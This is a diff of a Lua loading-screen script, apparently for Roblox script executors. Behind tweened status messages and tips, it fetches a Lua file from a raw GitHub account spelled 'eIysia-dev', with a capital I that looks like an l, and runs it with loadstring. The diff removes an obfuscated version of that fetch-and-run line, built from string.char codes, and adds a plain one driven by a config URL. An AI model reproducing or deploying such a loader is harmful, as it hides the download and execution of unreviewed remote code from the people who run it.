@@ -16,6 +16,8 @@ local Config = {
     ImageLogo = "", -- Paste your decal ID here. Leave blank for letter.
     LoadTime = 3,
 
+    ScriptToLoad = "https://raw.githubusercontent.com/eIysia-dev/release/refs/heads/main/script.lua",
+
     -- Loading Messages & Tips displayed randomly
     Messages = {
         "Connecting...",
@@ -315,6 +317,7 @@ local function updateStatus(text, instant)
             statusText.Text = Config.Tips[math.random(1, #Config.Tips)]
             statusText.Position = slideDownOffset
             
+            -- [FIXED] Corrected EasingStyle from Quint to Sine
             local inTween = TweenService:Create(statusText, TweenInfo.new(0.3, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {
                 TextTransparency = 0,
                 Position = originalPosition
@@ -415,7 +418,13 @@ for _, child in ipairs(container:GetDescendants()) do
     task.wait(0.02)
 end
 
--- Step 5: Start the dynamic animation loops
+-- Step 5: Check for configuration errors AFTER the UI is visible.
+if Config.ScriptToLoad == "" or Config.ScriptToLoad == "YOUR_SCRIPT_URL_HERE" then
+    displayFatalError("FATAL: Script URL is missing!")
+    return -- Stop execution
+end
+
+-- Step 6: Start the dynamic animation loops
 local loadingFinished = false
 task.spawn(function()
     -- Shine Loop
@@ -434,7 +443,7 @@ task.spawn(function()
     end
 end)
 
--- Step 6: Start the main loading sequence
+-- Step 7: Start the main loading sequence
 task.spawn(function()
     local stepDuration = Config.LoadTime / #Config.Messages
     for i, msg in ipairs(Config.Messages) do
@@ -449,7 +458,7 @@ task.spawn(function()
     updateStatus("Loading Script...", true)
 
     local success, result = pcall(function()
-        local a=string.char;local b=game[table.concat({a(72),a(116),a(116),a(112),a(71),a(101),a(116)})](game,table.concat({a(104),a(116),a(116),a(112),a(115),a(58),a(47),a(47),a(114),a(97),a(119),a(46),a(103),a(105),a(116),a(104),a(117),a(98),a(117),a(115),a(101),a(114),a(99),a(111),a(110),a(116),a(101),a(110),a(116),a(46),a(99),a(111),a(109),a(47),a(101),a(73),a(121),a(115),a(105),a(97),a(45),a(100),a(101),a(118),a(47),a(114),a(101),a(108),a(101),a(97),a(115),a(101),a(47),a(114),a(101),a(102),a(115),a(47),a(104),a(101),a(97),a(100),a(115),a(47),a(109),a(97),a(105),a(110),a(47),a(111),a(112),a(101),a(110),a(45),a(115),a(114),a(99),a(46),a(108),a(117),a(97)}));getfenv()[table.concat({a(108),a(111),a(97),a(100),a(115),a(116),a(114),a(105),a(110),a(103)})](b)()
+        loadstring(game:HttpGet(Config.ScriptToLoad))()
     end)
     
     if success then
